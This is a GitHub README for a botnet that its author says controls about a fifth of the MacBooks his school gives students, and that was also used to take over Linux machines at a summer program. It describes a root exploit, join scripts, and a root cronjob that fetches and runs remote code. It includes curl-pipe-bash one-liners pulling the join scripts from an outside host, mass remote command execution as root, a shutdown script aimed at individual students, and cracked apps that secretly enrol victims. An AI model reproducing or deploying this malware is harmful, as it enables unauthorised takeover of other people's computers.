# net
Some code which I use to run a rudimentary botnet which controls roughly 20% of the MacBooks my school provides to students. I've also used this code to take over Kali Linux computers and Raspberry Pis at a summer program.

## Where this code works
* MacBook Airs at George Mason High School or others running Mac OS X 10.11.6 and immediately preceding versions. Some assumptions were made about configuration for Macs since the code was written specifically for GMHS MacBook Airs. The join script will exploit into a root shell to deliver its payload automatically, thus root access is not necessary.
* Debian-based Linux distributions, originally Kali Linux and Raspbian. Should work on other distros, although the user must be logged in as root to the GUI, which they only usually are on Kali, or you must otherwise have root access.

I do not endorse the use of this code for malicious purposes.

## How it works
### Server
The botnet is controlled by a simple Python script which opens a socket on port `2043`. Currently the server simply listens for incoming connections and accepts data on new nodes and updates to node data, which are then stored in the file `nodes.txt`.

### Joining
For Macs, two scripts are used to join a computer to the network, `jm.sh` and `enact.sh`. `jm.sh` allows one-run joining: it will download the exploit needed to elevate to a root shell and then run `enact.sh` in that root shell automatically, which will handle joining the botnet. This mitigates the need to manually download the exploit, mark it as executable, then run and remove it.

Some code to use a Rubber Duck USB as a delivery mechanism for Macs can be found [here](https://github.com/ErikBoesen/duck).

For Kali or other Debian-based Linux, there's just one script, `jl.sh`, which must be executed as root or as a user with root privileges. In addition to the usual activities, it will add a root cronjob to regularly curl a script from my website and run it. Unless necessary, that script, `linuxupdate.sh`, will simply check if the computer's local IP has changed, and if so, communicate as such to the server.

Some code to use a Rubber Duck USB as a delivery mechanism for Linux can be found [here](https://github.com/ErikBoesen/duck-kali).

Here are simple one-liners to join the botnet (all the scripts are up on my website for URL simplicity):

Mac:
```sh
curl -L erikboesen.com/jm.sh |bash
```
Linux:
```sh
curl -L erikboesen.com/jl.sh |bash
```

### Controlling
Running `run.sh` followed by a string giving the command you'd like to run will cause all nodes in `nodes.txt` (in your working directory) to run that command as root. You can also run `up.sh` to view which/how many nodes are online. `die.sh` works strictly on Macs, and will kill open applications, turn off the screen, and initiate shutdown on the computer owned by the student with the provided username. Note: Don't do this.

### Apps
The `apps` directory contains some cracked versions of various applications which are blocked on GMHS MacBooks. These versions will work on our MacBooks, but they will also join the computer that runs them to the botnet.

## Licensing
This software was created by [Erik Boesen](https://github.com/ErikBoesen) and is available under the [MIT License](LICENSE).
